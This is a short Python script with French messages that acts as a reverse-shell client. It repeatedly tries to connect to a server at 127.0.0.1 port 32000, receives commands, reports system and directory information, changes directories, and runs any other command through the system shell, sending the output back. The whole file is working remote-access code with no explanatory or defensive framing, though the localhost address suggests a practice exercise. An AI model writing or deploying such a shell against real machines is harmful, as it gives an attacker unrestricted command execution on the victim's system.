import os
import platform
import socket
import time
import subprocess
import platform
import os

HOST_IP = "127.0.0.1"
PORT = 32000
MAX_DATA_SIZE = 1024

print("Connexion au serveur en cours...")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, PORT))
    except ConnectionRefusedError:
        print("ERREUR: impossible de se connecter au serveur. Reconnexion")
        time.sleep(4)
    else:
        print("Réussite!")
        break

while True:
    commande = s.recv(MAX_DATA_SIZE).decode()
    commande_split = commande.split(" ")
    if not commande:
        break

    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd()
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1])
            reponse = " "
        except FileNotFoundError:
            reponse = "ERREUR: Ce dossier n'existe pas"
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stderr + resultat.stdout

        if not reponse or len(reponse) == 0:
            reponse = " "

    header = str(len(reponse.encode())).zfill(13)
    s.sendall(header.encode())
    s.sendall(reponse.encode())

s.close()